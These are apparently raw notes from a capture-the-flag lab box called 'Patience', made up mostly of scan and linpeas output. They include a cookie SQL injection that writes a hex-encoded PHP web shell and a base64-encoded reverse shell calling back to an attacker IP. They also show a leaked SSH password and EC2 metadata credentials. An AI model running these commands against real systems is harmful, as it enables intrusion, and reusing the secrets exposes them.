Patience

10.10.174.233

â””â”€$ nmap -A -p- -T4 10.10.174.233
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 09:56 GMT
Nmap scan report for 10.10.174.233
Host is up (0.035s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
|_  256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Patience
|_http-server-header: Apache/2.4.29 (Ubuntu)
46923/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.66 seconds

â””â”€$ feroxbuster --url http://10.10.174.233 --wordlist  /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 200
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://10.10.174.233
 ğŸš€  Threads               â”‚ 200
 ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
 ğŸ‘Œ  Status Codes          â”‚ All Status Codes!
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        4l        7w       95c http://10.10.174.233/assets/css/dancing.css
301      GET        9l       28w      315c http://10.10.174.233/assets => http://10.10.174.233/assets/
200      GET      544l     1270w    47312c http://10.10.174.233/assets/fonts/DancingScript-Regular.otf
200      GET      985l     1816w    84827c http://10.10.174.233/assets/fonts/Alegreya-Regular.otf
200      GET       22l       57w      669c http://10.10.174.233/
200      GET        4l        6w       82c http://10.10.174.233/assets/css/alegreya.css
200      GET       47l       91w      733c http://10.10.174.233/assets/css/style.css
200      GET      335l     1978w   151691c http://10.10.174.233/assets/img/flag.jpg
200      GET        0l        0w  7576966c http://10.10.174.233/assets/img/patience.mp4
[####################] - 6m   1185265/1185265 0s      found:9       errors:95     
[####################] - 6m   1185240/1185240 3054/s  http://10.10.174.233/ 
[####################] - 0s   1185240/1185240 9406667/s http://10.10.174.233/assets/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s   1185240/1185240 168526/s http://10.10.174.233/assets/img/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s   1185240/1185240 6372258/s http://10.10.174.233/assets/fonts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 6s   1185240/1185240 184847/s http://10.10.174.233/assets/css/ => Directory listing (add --scan-dir-listings to scan) 

Burp request : 


GET /assets/img/patience.mp4 HTTP/1.1
Host: 10.10.174.233
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: */*
Referer: http://10.10.174.233/
Cookie: id=e8457caa62356709222a03e113b98b00 => interesting
Range: bytes=0-
Connection: keep-

â””â”€$ curl http://10.10.183.77 --cookie "id=f702677dcc9a1585ebfa2dab8bbefd7e' INTO OUTFILE '/var/www/html/test7.txt' LINES TERMINATED BY 0x3c3f3d207368656c6c5f6578656328245f4745545b2263225d293b3f3e0a#" -vvv


â””â”€$ curl --location 'http://patience/test3.php?c=echo%20c2ggLWkgPiYgL2Rldi90Y3AvMTAuMjEuNzguMTQyLzQ0NDQgMD4mMQ==%20|%20base64%20-d%20|%20bash' -vvv

cat /home/cookie-monster/cookie_analysis | grep cookie : 

Sep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user cookie-monster Giv3_Me_M04r_Co0Ki3s 192.168.1.142 port 45624 [preauth]

OS: Linux version 4.15.0-196-generic (buildd@lcy02-amd64-018) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #207-Ubuntu SMP Thu Oct 27 21:24:58 UTC 2022
User & Groups: uid=1000(cookie-monster) gid=1000(cookie-monster) groups=1000(cookie-monster)
Hostname: cookies
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ System Information â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                              â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•”â•â•â•â•â•â•â•â•â•â•â•£ Operative system
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-196-generic (buildd@lcy02-amd64-018) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #207-Ubuntu SMP Thu Oct 27 21:24:58 UTC 2022
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.6 LTS
Release:	18.04
Codename:	bionic

â•”â•â•â•â•â•â•â•â•â•â•â•£ Sudo version
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2


â•”â•â•â•â•â•â•â•â•â•â•â•£ PATH
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

â•”â•â•â•â•â•â•â•â•â•â•â•£ Date & uptime
Tue Nov  5 12:10:09 GMT 2024
 12:10:09 up 12 min,  1 user,  load average: 0.15, 0.19, 0.19

â•”â•â•â•â•â•â•â•â•â•â•â•£ Any sd*/disk* disk in /dev? (limit 20)
disk

â•”â•â•â•â•â•â•â•â•â•â•â•£ Unmounted file-system?
â•š Check if you can mount umounted devices
UUID=0f1ca0ab-d690-45f8-b44d-d1ad60d528ba	/	ext4	errors=remount-ro	0 1

â•”â•â•â•â•â•â•â•â•â•â•â•£ Environment
â•š Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
MAIL=/var/mail/cookie-monster
USER=cookie-monster
SSH_CLIENT=10.21.78.142 53640 22
SHLVL=1
HOME=/home/cookie-monster
SSH_TTY=/dev/pts/0
LOGNAME=cookie-monster
_=./linpeas.sh
TERM=xterm-256color
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
LANG=C.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/home/cookie-monster
SSH_CONNECTION=10.21.78.142 53640 10.10.129.196 22
HISTFILE=/dev/null

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching Signature verification failed in dmesg
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

â•”â•â•â•â•â•â•â•â•â•â•â•£ Executing Linux Exploit Suggester
â•š https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


â•”â•â•â•â•â•â•â•â•â•â•â•£ Executing Linux Exploit Suggester 2
â•š https://github.com/jondonas/linux-exploit-suggester-2

â•”â•â•â•â•â•â•â•â•â•â•â•£ Protections
â•â•£ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
â•â•£ AppArmor profile? .............. unconfined
â•â•£ is linuxONE? ................... s390x Not Found
â•â•£ grsecurity present? ............ grsecurity Not Found
â•â•£ PaX bins present? .............. PaX Not Found
â•â•£ Execshield enabled? ............ Execshield Not Found
â•â•£ SELinux enabled? ............... sestatus Not Found
â•â•£ Seccomp enabled? ............... disabled
â•â•£ User namespace? ................ enabled
â•â•£ Cgroup2 enabled? ............... enabled
â•â•£ Is ASLR enabled? ............... Yes
â•â•£ Printer? ....................... No
â•â•£ Is this a virtual machine? ..... Yes (xen)

                                   â•”â•â•â•â•â•â•â•â•â•â•â•â•—
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Container â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                                   â•šâ•â•â•â•â•â•â•â•â•â•â•â•
â•”â•â•â•â•â•â•â•â•â•â•â•£ Container related tools present (if any):
/usr/bin/docker
/usr/bin/lxc
/usr/sbin/runc
â•”â•â•â•â•â•â•â•â•â•â•â•£ Am I Containered?
â•”â•â•â•â•â•â•â•â•â•â•â•£ Container details
â•â•£ Is this a container? ........... No
â•â•£ Any running containers? ........ No


                                     â•”â•â•â•â•â•â•â•â•—
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Cloud â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                                     â•šâ•â•â•â•â•â•â•â•
â•â•£ Google Cloud Platform? ............... No
â•â•£ AWS ECS? ............................. No
â•â•£ AWS EC2? ............................. Yes
â•â•£ AWS EC2 Beanstalk? ................... No
â•â•£ AWS Lambda? .......................... No
â•â•£ AWS Codebuild? ....................... No
â•â•£ DO Droplet? .......................... No
â•â•£ Aliyun ECS? .......................... No
â•â•£ IBM Cloud VM? ........................ No
â•â•£ Azure VM? ............................ No
â•â•£ Azure APP? ........................... No

â•”â•â•â•â•â•â•â•â•â•â•â•£ AWS EC2 Enumeration
ami-id: ami-09bf410adbbf5710d
instance-action: none
instance-id: i-015bbc716eb0002b3
instance-life-cycle: on-demand
instance-type: t2.medium
region: eu-west-1

â•â•â•£ Account Info
{
  "Code" : "Success",
  "LastUpdated" : "2024-11-05T11:56:03Z",
  "AccountId" : "739930428441"
}

â•â•â•£ Network Info
Mac: 02:ba:3f:19:0c:2b/
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



â•â•â•£ IAM Role


â•â•â•£ User Data


EC2 Security Credentials
{
  "Code" : "Success",
  "LastUpdated" : "2024-11-05T11:56:30Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA2YR2KKQM5YH3H2NZ",
  "SecretAccessKey" : "aYZjMkS1Q1zPg4l9hk6LfYlsjyfkSYEmqHuSk0JQ",
  "Token" : "IQoJb3JpZ2luX2VjEIz//////////wEaCWV1LXdlc3QtMSJIMEYCIQDVB7/9jt2QW8cCNfJsdvWU5rxW8GFP8/ucOfh6NApxAgIhAMQy0CObuRoMdHohKlYNL9NldvU6Mo4KUc6SGbvWKzzPKsYECBUQAxoMNzM5OTMwNDI4NDQxIgzFENen3lsMmC6g9v0qowSoXnxGryN3k6GBi1dsnLuhoYg9xY1Jusl4SZbmFWl4NqW7ESZ4Bl0xXAzZ21/hzHp5efkgPbFMGgEYGmBbVZWZ9ibxltulin8KDc/yO4UCPODP+oqdkTMucLFh/HscBEAHB9rIzVdQgVsQGaxgIccv02VeVLZrpt5O9uGKaT4DbGsvjoXHKxPEN18M5qU3f2q4AcRw7m70fwAN8M7cQWPVF4w3fWyRfS0HNLdexNQo9bCoigiwblMg+5P8D+feGxzcrpwxumlx1IkFnouQXvNx+8CMev3hbdusRn9Zkc6vlaYDMAnYZhvWr/xDlBBtbC3Tc02Yzg6pNmyQ8hW30DEAMRaqrdWuedW5nQbbDpqqWDNkiiw1A9oHTi/8T6tAev8wXnrnnRSYWAhAhPYBIyzH2ysjvA037NfpBT2P6FVbZXjXb8Fg8TQcVfmxubH8X7BFCy8ro26c3qqiLWddEzXjCZ3v4tPhInUin/GckeREwWVDYYdk6TAOAur6talCJxyOaOly4BSZxoLSTAdAQ7N4vcWtVT5VWOVjVp6Oy/ibU+r54/D/sPUeyMGbl9hMuesRQde91qvqPbB7vUGLaJaT0+f16i+Uz+Z0D8kAQGizxGk+XaFrPkeEw5XDOl0mxNnYiGfZKe+edmRqCXs9hzxf0OTWJAul3ebvLHe2Ga3efMiZNhX7/Rux8ySsYEvP2RLFjTQ7lAQxHZRXD5lGlxQYs8UCMNqPqLkGOpICBMzx2vYrYTx6gnrtNUHKvPpjx5lhMOkdl1+wp4PLxvAv75DtENgD1NSs/q2MRENEbBWAeZFFLKymi5W43MJ+2ZU1vhg6F3fXZvWAJo+J5VEK1BLnSuPM/+yr6fHJb8VaMw8I+RFr5sRJsyVY8Yr4m4/Fwlxu+nACz4jz3g9Xw47yILrTdSXvYyYnzZhSCB5JyQmU8SFOH5SaeIVkiT4w+H4HeXVsb2DgpZBl9+m/aD2yE/cwIt9SekrOUOj+7IyACVxJ+Gg7CpZMvRp9n4YZYdC7sCAVtVsbjdfCG5QPMXtcXrA3zeiM4nfuEoW310x8SqR4Ee252dQ5P4dvD0WoDQ1yB605OOT7qCm8m6AvDoLhPw==",
  "Expiration" : "2024-11-05T18:01:21Z"
}
â•â•â•£ SSM Runnig
cookie-+ 23317  0.0  0.0  18248  1160 pts/0    S+   12:10   0:00 sed s,ssm-agent,?[1;31m&?[0m,


                â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Processes, Crons, Timers, Services and Sockets â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•”â•â•â•â•â•â•â•â•â•â•â•£ Cleaned processes
â•š Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.1  0.2 159564  8712 ?        Ss   11:57   0:01 /sbin/init
root       407  0.0  0.2 111048  9056 ?        S<s  11:57   0:00 /lib/systemd/systemd-journald
root       415  0.0  0.0  97712  1812 ?        Ss   11:57   0:00 /sbin/lvmetad -f
root       436  0.1  0.1  47928  6748 ?        Ss   11:57   0:01 /lib/systemd/systemd-udevd
systemd+   489  0.0  0.0 141788  3192 ?        Ssl  11:57   0:00 /lib/systemd/systemd-timesyncd
  â””â”€(Caps) 0x0000000002000000=cap_sys_time
systemd+   499  0.0  0.1  79924  5080 ?        Ss   11:57   0:00 /lib/systemd/systemd-networkd
  â””â”€(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   508  0.0  0.1  70496  4980 ?        Ss   11:57   0:00 /lib/systemd/systemd-resolved
root       565  0.0  0.0 110420  2040 ?        Ssl  11:57   0:00 /usr/sbin/irqbalance --foreground
root       567  0.0  0.1  61996  5532 ?        Ss   11:57   0:00 /lib/systemd/systemd-logind
syslog     568  0.0  0.1 263048  4208 ?        Ssl  11:57   0:00 /usr/sbin/rsyslogd -n
root       570  0.0  0.0  31324  3244 ?        Ss   11:57   0:00 /usr/sbin/cron -f
root       611  0.0  0.4 170824 17600 ?        Ssl  11:57   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
message+   612  0.0  0.1  50140  4496 ?        Ss   11:57   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  â””â”€(Caps) 0x0000000020000000=cap_audit_write
root       623  0.5  0.0 309392  1960 ?        Ssl  11:57   0:04 /usr/bin/lxcfs /var/lib/lxcfs/
daemon[0m     625  0.0  0.0  28336  2448 ?        Ss   11:57   0:00 /usr/sbin/atd -f
root       627  0.0  0.1 287552  6776 ?        Ssl  11:57   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       628  0.0  0.5 187244 20220 ?        Ssl  11:57   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       633  0.1  1.2 981872 50356 ?        Ssl  11:57   0:00 /usr/bin/containerd
root       668  0.0  0.1 291452  7164 ?        Ssl  11:57   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       672  0.0  0.0  15964  2304 ttyS0    Ss+  11:57   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root       694  0.0  0.0  16188  1960 tty1     Ss+  11:57   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
mysql      701  0.0  4.6 1421900 187804 ?      Sl   11:57   0:00 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root       706  0.0  0.4 333732 16728 ?        Ss   11:57   0:00 /usr/sbin/apache2 -k start
www-data   814  0.0  0.3 338544 14240 ?        S    11:57   0:00  _ /usr/sbin/apache2 -k start
www-data   815  0.0  0.2 338132  9220 ?        S    11:57   0:00  _ /usr/sbin/apache2 -k start
www-data   816  0.0  0.2 338132  9220 ?        S    11:57   0:00  _ /usr/sbin/apache2 -k start
www-data   817  0.0  0.2 338132  9220 ?        S    11:57   0:00  _ /usr/sbin/apache2 -k start
www-data   819  0.0  0.2 338132  9220 ?        S    11:57   0:00  _ /usr/sbin/apache2 -k start
root       851  0.0  0.1  72304  5752 ?        Ss   11:57   0:00 /usr/sbin/sshd -D
cookie-+  1427  0.0  0.1  75880  5164 ?        S    11:59   0:00      _ sshd: cookie-monster@pts/0
cookie-+  1429  0.0  0.1  24404  5224 pts/0    Ss   12:00   0:00          _ -bash
cookie-+ 19783  0.5  0.0   5348  2540 pts/0    S+   12:09   0:00              _ /bin/sh ./linpeas.sh
cookie-+ 23331  0.0  0.0   5348   928 pts/0    S+   12:10   0:00                  _ /bin/sh ./linpeas.sh
cookie-+ 23335  0.0  0.0  41552  3736 pts/0    R+   12:10   0:00                  |   _ ps fauxwww
cookie-+ 23334  0.0  0.0   5348   928 pts/0    S+   12:10   0:00                  _ /bin/sh ./linpeas.sh
root       965  0.0  2.2 912056 90572 ?        Ssl  11:57   0:00 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root      1238  0.0  0.0 404856  3076 ?        Sl   11:58   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1252  0.0  0.2 112696  9580 ?        Sl   11:58   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 42040a8f97fc38af61598b5a6e3f0bb08830bcb14b5b68a211201979658e4073 -address /run/containerd/containerd.sock
root      1275  0.0  0.0   1076   460 ?        Ss   11:58   0:00  _ /bin/s6-svscan /etc/s6
root      1342  0.0  0.0   1080   452 ?        S    11:58   0:00      _ s6-supervise gitea
cookie-+  1344  1.0  5.7 930916 233464 ?       Ssl  11:58   0:07      |   _ /app/gitea/gitea web
root      1343  0.0  0.0   1080   464 ?        S    11:58   0:00      _ s6-supervise openssh
cookie-+  9118  0.0  0.0  95072   716 ?        Ss   12:02   0:00 gpg-agent --homedir /home/cookie-monster/.gnupg --use-standard-socket --daemon[0m

â•”â•â•â•â•â•â•â•â•â•â•â•£ Binary processes permissions (non 'root root' and not belonging to current user)
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

â•”â•â•â•â•â•â•â•â•â•â•â•£ Processes whose PPID belongs to a different user (not root)
â•š You will know if a user can somehow spawn processes as a different user
Proc 489 with ppid 1 is run by user systemd-timesync but the ppid user is root
Proc 499 with ppid 1 is run by user systemd-network but the ppid user is root
Proc 508 with ppid 1 is run by user systemd-resolve but the ppid user is root
Proc 568 with ppid 1 is run by user syslog but the ppid user is root
Proc 612 with ppid 1 is run by user messagebus but the ppid user is root
Proc 625 with ppid 1 is run by user daemon but the ppid user is root
Proc 701 with ppid 1 is run by user mysql but the ppid user is root
Proc 814 with ppid 706 is run by user www-data but the ppid user is root
Proc 815 with ppid 706 is run by user www-data but the ppid user is root
Proc 816 with ppid 706 is run by user www-data but the ppid user is root
Proc 817 with ppid 706 is run by user www-data but the ppid user is root
Proc 819 with ppid 706 is run by user www-data but the ppid user is root
Proc 1344 with ppid 1342 is run by user cookie-monster but the ppid user is root
Proc 1427 with ppid 1417 is run by user cookie-monster but the ppid user is root
Proc 9118 with ppid 1 is run by user cookie-monster but the ppid user is root

â•”â•â•â•â•â•â•â•â•â•â•â•£ Files opened by processes belonging to other users
â•š This is usually empty because of the lack of privileges to read other user processes information
COMMAND     PID   TID             USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME

â•”â•â•â•â•â•â•â•â•â•â•â•£ Processes with credentials in memory (root req)
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd: process found (dump creds from memory as root)

â•”â•â•â•â•â•â•â•â•â•â•â•£ Cron jobs
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
